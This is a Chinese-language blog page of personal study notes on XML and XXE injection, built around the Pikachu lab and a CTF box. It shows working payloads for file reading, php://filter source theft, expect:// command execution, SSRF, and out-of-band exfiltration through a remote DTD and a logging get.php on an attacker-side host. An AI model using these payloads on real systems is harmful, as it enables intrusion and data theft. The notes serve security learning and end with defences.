@@ -1,0 +1,622 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<title>XML 与 XXE 漏洞学习笔记 - pusai</title>
+<link href="css/bootstrap.css" rel="stylesheet">
+<link href="css/style.css" rel="stylesheet">
+<link href="css/responsive.css" rel="stylesheet">
+<link rel="shortcut icon" href="images/favicon.png" type="image/x-icon">
+<link rel="icon" href="images/favicon.png" type="image/x-icon">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+<style>
+/* 博客页专用样式 */
+.post-page {
+    min-height: 100vh;
+    background: #fff;
+}
+.post-header {
+    padding: 20px 0;
+    border-bottom: 1px solid #eee;
+    margin-bottom: 40px;
+}
+.post-header .back-link {
+    color: #9147ff;
+    font-size: 15px;
+    text-decoration: none;
+}
+.post-header .back-link:hover {
+    color: #222;
+}
+.post-title {
+    font-size: 28px;
+    font-weight: 600;
+    color: #222;
+    margin-bottom: 10px;
+}
+.post-meta-bar {
+    color: #999;
+    font-size: 14px;
+    margin-bottom: 30px;
+    padding-bottom: 20px;
+    border-bottom: 1px solid #eee;
+}
+.post-meta-bar span {
+    color: #9147ff;
+}
+.post-cover {
+    width: 100%;
+    border-radius: 8px;
+    margin-bottom: 30px;
+}
+.post-content {
+    font-size: 16px;
+    line-height: 1.9;
+    color: #333;
+}
+.post-content h1,
+.post-content h2,
+.post-content h3,
+.post-content h4 {
+    color: #222;
+    font-weight: 600;
+    margin-top: 32px;
+    margin-bottom: 16px;
+}
+.post-content h1 { font-size: 26px; }
+.post-content h2 { font-size: 22px; border-bottom: 1px solid #eee; padding-bottom: 8px; }
+.post-content h3 { font-size: 18px; }
+.post-content p {
+    margin-bottom: 18px;
+}
+.post-content pre {
+    background: #f6f8fa;
+    border-radius: 6px;
+    padding: 16px;
+    overflow-x: auto;
+    font-size: 14px;
+    line-height: 1.6;
+    border: 1px solid #e5e5e5;
+    margin-bottom: 20px;
+}
+.post-content code {
+    background: #f0f0f0;
+    padding: 2px 6px;
+    border-radius: 3px;
+    font-size: 14px;
+    color: #d63384;
+}
+.post-content pre code {
+    background: none;
+    padding: 0;
+    color: #333;
+}
+.post-content blockquote {
+    border-left: 4px solid #9147ff;
+    padding-left: 16px;
+    margin: 20px 0;
+    color: #666;
+    font-style: italic;
+}
+.post-content img {
+    max-width: 100%;
+    border-radius: 6px;
+    margin: 20px 0;
+}
+.post-content ul,
+.post-content ol {
+    margin-bottom: 18px;
+    padding-left: 24px;
+}
+.post-content li {
+    margin-bottom: 8px;
+}
+.post-content a {
+    color: #9147ff;
+}
+.post-content a:hover {
+    color: #222;
+}
+.post-content table {
+    width: 100%;
+    border-collapse: collapse;
+    margin-bottom: 20px;
+}
+.post-content th,
+.post-content td {
+    border: 1px solid #e5e5e5;
+    padding: 10px 14px;
+    text-align: left;
+}
+.post-content th {
+    background: #f8f8f8;
+    font-weight: 600;
+}
+.post-nav {
+    margin-top: 40px;
+    padding-top: 24px;
+    border-top: 1px solid #eee;
+    display: flex;
+    justify-content: space-between;
+}
+.post-nav a {
+    color: #9147ff;
+    text-decoration: none;
+    font-size: 15px;
+    max-width: 45%;
+}
+.post-nav a:hover {
+    color: #222;
+}
+.post-nav .nav-next {
+    text-align: right;
+}
+.post-footer {
+    margin-top: 40px;
+    padding: 20px 0;
+    border-top: 1px solid #eee;
+    text-align: center;
+}
+.post-footer a {
+    color: #9147ff;
+    text-decoration: none;
+}
+</style>
+</head>
+<body>
+
+<div class="page-wrapper default-version post-page">
+    <div class="container" style="padding-top:30px;padding-bottom:60px;">
+        <div class="row">
+            <div class="col-md-8 col-md-offset-2">
+
+                <div class="post-header">
+                    <a class="back-link" href="index.html">← 返回首页</a>
+                </div>
+
+                <h1 class="post-title">XML 与 XXE 漏洞学习笔记</h1>
+                <div class="post-meta-bar">
+                    2025 年 6月 10 日 / <span>安全, XXE, XML, 笔记</span>
+                </div>
+
+                
+
+                <div class="post-content">
+                    <h1>xml可扩展标记语言</h1>
+<pre><code>html
+&lt;h1&gt;
+&lt;h2&gt;
+&lt;p&gt;
+</code></pre>
+<ul>
+<li>XML仅仅是纯文本，他不会做任何事情。</li>
+<li>XML可以自己发明标签（允许定义自己的标签和文档结构）</li>
+<li>简单来说：XML就是用来存储和传输数据的</li>
+</ul>
+<pre><code>&lt;?xml version=’1.0’?&gt;						//声明XML解析器版本来解析
+&lt;person&gt;								//根元素
+&lt;name&gt;test&lt;/name&gt;						//子元素，里面的test就是值
+&lt;age&gt;20&lt;/age&gt;
+&lt;/person&gt;
+</code></pre>
+<pre><code>user=123&amp;pass=123		常规
+{&quot;user&quot;:123;&quot;pass&quot;:123}	json
+
+&lt;?xml version=’1.0’?&gt;					
+&lt;person&gt;							
+&lt;name&gt;123&lt;/name&gt;						
+&lt;pass&gt;123&lt;/pass&gt;
+&lt;/person&gt;
+</code></pre>
+<h1>DTD文档类型定义（实体）</h1>
+<p>内部实体</p>
+<p>定义一个内部实体（类似于变量名/变量值）</p>
+<p><code>&lt;!ENTITY 实体名称 “实体的值”&gt;</code></p>
+<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE note[
+&lt;!ELEMENT note (name)&gt;
+&lt;!ENTITY hack3r &quot;hu3sky&quot;&gt;
+]&gt;
+&lt;note&gt;
+  &lt;name&gt;&amp;hack3r;&lt;/name&gt;
+&lt;/note&gt;
+</code></pre>
+<p>外部实体（调用外部DTD文件）</p>
+<p><code>&lt;!ENTITY 实体名称 SYSTEM “URI/URL”&gt;</code></p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE a[
+&lt;!ENTITY  name SYSTEM &quot;http://xx.com/aa.dtd&quot;&gt;]&gt;
+&lt;a&gt;
+&lt;name&gt;&amp;name;&lt;/name&gt;
+&lt;/a&gt;
+</code></pre>
+<pre><code class="language-xml">//aa.dtd文件
+&lt;!DOCTYPE scan [
+&lt;!ENTITY test SYSTEM &quot;file:///c:/1.txt&quot;&gt;]&gt;  //DTD部分 从外部获取文件（实体file:///c:/1.txt并命名为test
+
+//&amp;实体名;  调用实体
+&lt;scan&gt;&amp;test;&lt;/scan&gt;  //XML部分，实体test在&lt;scan&gt;&lt;/scan&gt;标签内有用 
+</code></pre>
+<p>参数实体</p>
+<p><code>&lt;!ENTITY %实体名称 “值”&gt;</code> </p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE note [
+&lt;!ENTITY % b &quot;&lt;!ENTITY b1 &#39;awsl&#39;&gt;&quot;&gt;
+        %b;
+        ]&gt;
+&lt;note&gt;&amp;b1;&lt;/note&gt;
+</code></pre>
+<p>外部参数实体</p>
+<p><code>&lt;!ENTITY %实体名称 SYSTEM “URL”&gt;</code></p>
+<pre><code class="language-xml">&lt;?xml version=”1.0”?&gt;
+&lt;!DOCTYPE a[
+&lt;!ENTITY % name SYSTEM  “file:///etc/passwd”&gt; //外部实体调用伪协议
+%name;
+]&gt;
+</code></pre>
+<h1>XXE漏洞（外部实体注入漏洞）</h1>
+<p>实体:DTD(文档类型定义)</p>
+<p>内部实体</p>
+<p>外部实体</p>
+<p>参数实体</p>
+<h2>漏洞触发函数</h2>
+<p>引发XXE漏洞的函数为PHP里的<code>simplexml</code>函数
+simplexml_load_string() :读取字符串内容当做xml执行
+simplexml_load_file():读取文件当做xml执行</p>
+<h1>XXE漏洞支持的协议</h1>
+<p><img src="./img/image-20241223203707334.png" alt="image-20241223203707334"></p>
+<h1>靶场</h1>
+<pre><code>&lt;?xml version=&#39;1.0&#39;?&gt;
+&lt;a&gt;aaa;&lt;/a&gt;
+</code></pre>
+<h2>读取文件</h2>
+<pre><code class="language-xml">&lt;?xml version=&#39;1.0&#39;?&gt;
+&lt;!DOCTYPE a [
+&lt;!ENTITY haha SYSTEM &quot;file:///c:/1.txt&quot;&gt;
+]&gt;
+&lt;xxxx&gt;&amp;haha;&lt;/xxxx&gt;
+</code></pre>
+<h2>读取源码</h2>
+<pre><code>&lt;?xml version = &quot;1.0&quot;?&gt;  
+&lt;!DOCTYPE ccccccccc [
+&lt;!ENTITY f SYSTEM &quot;php://filter/read=convert.base64-encode/resource=./xxe_1.php&quot;&gt; 
+]&gt;
+&lt;xxxxxx&gt;&amp;f;&lt;/xxxxxx&gt;
+</code></pre>
+<pre><code class="language-php">&lt;?php
+/**
+ * Created by runner.han
+ * There is nothing new under the sun
+ */
+
+
+$SELF_PAGE = substr($_SERVER[&#39;PHP_SELF&#39;],strrpos($_SERVER[&#39;PHP_SELF&#39;],&#39;/&#39;)+1);
+
+if ($SELF_PAGE = &quot;xxe_1.php&quot;){
+    $ACTIVE = array(&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;active open&#39;,&#39;&#39;,&#39;active&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;);
+}
+
+$PIKA_ROOT_DIR =  &quot;../../&quot;;
+include_once $PIKA_ROOT_DIR.&#39;header.php&#39;;
+
+
+//payload,url编码一下:
+$xxepayload1 = &lt;&lt;&lt;EOF
+&lt;?xml version = &quot;1.0&quot;?&gt;
+&lt;!DOCTYPE ANY [
+    &lt;!ENTITY f SYSTEM &quot;file:///etc/passwd&quot;&gt;
+]&gt;
+&lt;x&gt;&amp;f;&lt;/x&gt;
+EOF;
+
+$xxetest = &lt;&lt;&lt;EOF
+&lt;?xml version = &quot;1.0&quot;?&gt;
+&lt;!DOCTYPE note [
+    &lt;!ENTITY hacker &quot;ESHLkangi&quot;&gt;
+]&gt;
+&lt;name&gt;&amp;hacker;&lt;/name&gt;
+EOF;
+
+//$xxedata = simplexml_load_string($xxetest,&#39;SimpleXMLElement&#39;);
+//print_r($xxedata);
+
+
+//查看当前LIBXML的版本
+//print_r(LIBXML_VERSION);
+
+$html=&#39;&#39;;
+//考虑到目前很多版本里面libxml的版本都&gt;=2.9.0了,所以这里添加了LIBXML_NOENT参数开启了外部实体解析
+if(isset($_POST[&#39;submit&#39;]) and $_POST[&#39;xml&#39;] != null){
+
+
+    $xml =$_POST[&#39;xml&#39;];
+//    $xml = $test;
+    $data = @simplexml_load_string($xml,&#39;SimpleXMLElement&#39;,LIBXML_NOENT);
+    if($data){
+        $html.=&quot;&lt;pre&gt;{$data}&lt;/pre&gt;&quot;;
+    }else{
+        $html.=&quot;&lt;p&gt;XML声明、DTD文档类型定义、文档元素这些都搞懂了吗?&lt;/p&gt;&quot;;
+    }
+}
+
+?&gt;
+
+
+&lt;div class=&quot;main-content&quot;&gt;
+    &lt;div class=&quot;main-content-inner&quot;&gt;
+        &lt;div class=&quot;breadcrumbs ace-save-state&quot; id=&quot;breadcrumbs&quot;&gt;
+            &lt;ul class=&quot;breadcrumb&quot;&gt;
+                &lt;li&gt;
+                    &lt;i class=&quot;ace-icon fa fa-home home-icon&quot;&gt;&lt;/i&gt;
+                    &lt;a href=&quot;xee.php&quot;&gt;&lt;/a&gt;
+                &lt;/li&gt;
+                &lt;li class=&quot;active&quot;&gt;xxe漏洞&lt;/li&gt;
+            &lt;/ul&gt;
+            &lt;a href=&quot;#&quot; style=&quot;float:right&quot; data-container=&quot;body&quot; data-toggle=&quot;popover&quot; data-placement=&quot;bottom&quot; title=&quot;tips(再点一下关闭)&quot;
+               data-content=&quot;先把XML声明、DTD文档类型定义、文档元素这些基础知识自己看一下&quot;&gt;
+                点一下提示~
+            &lt;/a&gt;
+        &lt;/div&gt;
+        &lt;div class=&quot;page-content&quot;&gt;
+
+            &lt;form method=&quot;post&quot;&gt;
+                &lt;p&gt;这是一个接收xml数据的api:&lt;/p&gt;
+                    &lt;input type=&quot;text&quot; name=&quot;xml&quot; /&gt;
+                    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;
+            &lt;/form&gt;
+            &lt;?php echo $html;?&gt;
+
+
+        &lt;/div&gt;&lt;!-- /.page-content --&gt;
+    &lt;/div&gt;
+&lt;/div&gt;&lt;!-- /.main-content --&gt;
+
+
+
+&lt;?php
+include_once $PIKA_ROOT_DIR . &#39;footer.php&#39;;
+
+?&gt;
+</code></pre>
+<h2>命令执行</h2>
+<p>开启php中的expect扩展</p>
+<pre><code>&lt;?xml version = &quot;1.0&quot;?&gt;  
+&lt;!DOCTYPE ANY [
+&lt;!ENTITY f SYSTEM &quot;expect://ipconfig&quot;&gt; 
+]&gt;
+&lt;x&gt;&amp;f;&lt;/x&gt;
+</code></pre>
+<h2>远程加载dtd</h2>
+<p>将恶意dtd文件放置在攻击者服务器</p>
+<pre><code>&lt;!ENTITY test SYSTEM &quot;file:///c:/1.txt&quot;&gt;
+</code></pre>
+<p>在漏洞点传参</p>
+<pre><code>&lt;?xml version=&#39;1.0&#39;?&gt;
+&lt;!DOCTYPE a [
+&lt;!ENTITY % d SYSTEM &quot;http://192.168.10.172/aa.dtd&quot;&gt;
+%d;
+]&gt;
+&lt;c&gt;&amp;test;&lt;/c&gt;
+</code></pre>
+<h1>扩展</h1>
+<p>协议</p>
+<p>ssrf:访问内网资源</p>
+<pre><code>&lt;?xml version = &quot;1.0&quot;?&gt;  
+&lt;!DOCTYPE ANY [
+&lt;!ENTITY f SYSTEM &quot;http://内网其他设备ip/具体文件路径&quot;&gt; 
+]&gt;
+&lt;x&gt;&amp;f;&lt;/x&gt;
+</code></pre>
+<h1>进阶利用：</h1>
+<h1>XXE无回显利用</h1>
+<p>我主动去找他</p>
+<p>让它来找我们</p>
+<h2>带外测试</h2>
+<p>做这个操作的目的,其实是为了验证该功能点是否有xxe漏洞</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; ?&gt;
+&lt;!DOCTYPE test [
+    &lt;!ENTITY % file SYSTEM &quot;http://yrxzxfnfhh.iyhc.eu.org&quot;&gt;
+    %file;
+]&gt;
+</code></pre>
+<h2>数据存放文件</h2>
+<p>思路：</p>
+<ol>
+<li>请求一个你自己搭建的php文件（你想要的数据给带出来）</li>
+<li>PHP文件记录请求的传参内容（记录文件）</li>
+<li>去看记录的文件就可以知道调用内容</li>
+</ol>
+<p>get.php</p>
+<pre><code>&lt;?php file_put_contents(&quot;file.txt&quot;,$_GET[&quot;file&quot;],FILE_APPEND);?&gt;
+</code></pre>
+<p>test.dtd  去请求php文件</p>
+<pre><code>&lt;!ENTITY % all
+&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http://192.168.10.172/get.php?file=%file;&#39;&gt;&quot;
+&gt;%all;
+</code></pre>
+<p>exp:</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE ANY[
+&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=c:/1.txt&quot;&gt; 
+&lt;!ENTITY % remote SYSTEM &quot;http://192.168.10.172/test.dtd&quot;&gt; 
+%remote;
+%send; 
+]&gt;
+</code></pre>
+<h1>XXE黑盒</h1>
+<h2>数据类型判断</h2>
+<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE a [
+&lt;!ENTITY d SYSTEM &quot;file:///C://Windows//win.ini&quot;&gt;
+]&gt;
+&lt;user&gt;
+  &lt;username&gt;&amp;d;&lt;/username&gt;&lt;password&gt;aaa&lt;/password&gt;&lt;/user&gt;
+</code></pre>
+<h2>MIME类型判断</h2>
+<p>盲测:如果遇到json格式传输，可以将Content-type改为xml，将传输数据修改为xml，查看返回进行测试</p>
+<p><a href="http://web.jarvisoj.com:9882/">http://web.jarvisoj.com:9882/</a></p>
+<pre><code>&lt;?xml version = &quot;1.0&quot;?&gt;
+&lt;!DOCTYPE ANY [
+    &lt;!ENTITY f SYSTEM &quot;file:///etc/passwd&quot;&gt;
+]&gt;
+&lt;x&gt;&amp;f;&lt;/x&gt;
+</code></pre>
+<h1>白盒</h1>
+<h1>xxe靶机</h1>
+<p>端口扫描获取ip</p>
+<p>目录扫描获取敏感路径</p>
+<p>分析数据包得知数据传输类型</p>
+<p>xxe漏洞测试</p>
+<pre><code>&lt;?php
+   session_start();
+?&gt;
+
+
+&lt;html lang = &quot;en&quot;&gt;
+   
+   &lt;head&gt;
+      &lt;title&gt;admin&lt;/title&gt;
+      &lt;link href = &quot;css/bootstrap.min.css&quot; rel = &quot;stylesheet&quot;&gt;
+      
+      &lt;style&gt;
+         body {
+            padding-top: 40px;
+            padding-bottom: 40px;
+            background-color: #ADABAB;
+         }
+         
+         .form-signin {
+            max-width: 330px;
+            padding: 15px;
+            margin: 0 auto;
+            color: #017572;
+         }
+         
+         .form-signin .form-signin-heading,
+         .form-signin .checkbox {
+            margin-bottom: 10px;
+         }
+         
+         .form-signin .checkbox {
+            font-weight: normal;
+         }
+         
+         .form-signin .form-control {
+            position: relative;
+            height: auto;
+            -webkit-box-sizing: border-box;
+            -moz-box-sizing: border-box;
+            box-sizing: border-box;
+            padding: 10px;
+            font-size: 16px;
+         }
+         
+         .form-signin .form-control:focus {
+            z-index: 2;
+         }
+         
+         .form-signin input[type=&quot;email&quot;] {
+            margin-bottom: -1px;
+            border-bottom-right-radius: 0;
+            border-bottom-left-radius: 0;
+            border-color:#017572;
+         }
+         
+         .form-signin input[type=&quot;password&quot;] {
+            margin-bottom: 10px;
+            border-top-left-radius: 0;
+            border-top-right-radius: 0;
+            border-color:#017572;
+         }
+         
+         h2{
+            text-align: center;
+            color: #017572;
+         }
+      &lt;/style&gt;
+      
+   &lt;/head&gt;
+	
+   &lt;body&gt;
+      
+      &lt;h2&gt;Enter Username and Password&lt;/h2&gt; 
+      &lt;div class = &quot;container form-signin&quot;&gt;
+         
+         &lt;?php
+            $msg = &#39;&#39;;
+            if (isset($_POST[&#39;login&#39;]) &amp;&amp; !empty($_POST[&#39;username&#39;]) 
+               &amp;&amp; !empty($_POST[&#39;password&#39;])) {
+				
+               if ($_POST[&#39;username&#39;] == &#39;administhebest&#39; &amp;&amp; 
+                  md5($_POST[&#39;password&#39;]) == &#39;e6e061838856bf47e1de730719fb2609&#39;) {
+                  $_SESSION[&#39;valid&#39;] = true;
+                  $_SESSION[&#39;timeout&#39;] = time();
+                  $_SESSION[&#39;username&#39;] = &#39;administhebest&#39;;
+                  
+                echo &quot;You have entered valid use name and password &lt;br /&gt;&quot;;
+		$flag = &quot;Here is the &lt;a style=&#39;color:FF0000;&#39; href=&#39;/flagmeout.php&#39;&gt;Flag&lt;/a&gt;&quot;;
+		echo $flag;
+               }else {
+                  $msg = &#39;Maybe Later&#39;;
+               }
+            }
+         ?&gt;
+      &lt;/div&gt; &lt;!-- W00t/W00t --&gt;
+      
+      &lt;div class = &quot;container&quot;&gt;
+      
+         &lt;form class = &quot;form-signin&quot; role = &quot;form&quot; 
+            action = &quot;&lt;?php echo htmlspecialchars($_SERVER[&#39;PHP_SELF&#39;]); 
+            ?&gt;&quot; method = &quot;post&quot;&gt;
+            &lt;h4 class = &quot;form-signin-heading&quot;&gt;&lt;?php echo $msg; ?&gt;&lt;/h4&gt;
+            &lt;input type = &quot;text&quot; class = &quot;form-control&quot; 
+               name = &quot;username&quot; 
+               required autofocus&gt;&lt;/br&gt;
+            &lt;input type = &quot;password&quot; class = &quot;form-control&quot;
+               name = &quot;password&quot; required&gt;
+            &lt;button class = &quot;btn btn-lg btn-primary btn-block&quot; type = &quot;submit&quot; 
+               name = &quot;login&quot;&gt;Login&lt;/button&gt;
+         &lt;/form&gt;
+			
+         Click here to clean &lt;a href = &quot;adminlog.php&quot; tite = &quot;Logout&quot;&gt;Session.
+         
+      &lt;/div&gt; 
+      
+   &lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<pre><code>&lt;?php
+$flag = &quot;&lt;!-- the flag in (JQZFMMCZPE4HKWTNPBUFU6JVO5QUQQJ5) --&gt;&quot;;
+echo $flag;
+?&gt;
+/etc/.flag.php
+</code></pre>
+<h1>修复防御</h1>
+<ol>
+<li>打开php的libxml_disable_entity_loader(true)，不允许加载外部实体。</li>
+<li>过滤用户提交的xml数据，比如ENTITY，SYSTEM</li>
+</ol>
+
+                </div>
+
+                <div class="post-nav">
+                    <div class="nav-prev">
+                        <a href="摄影随笔.html">← 摄影随笔</a>
+                    </div>
+                    <div class="nav-next">
+                        
+                    </div>
+                </div>
+
+                <div class="post-footer">
+                    <a href="index.html">← 返回首页</a>
+                </div>
+
+            </div>
+        </div>
+    </div>
+</div>
+
+</body>
+</html>
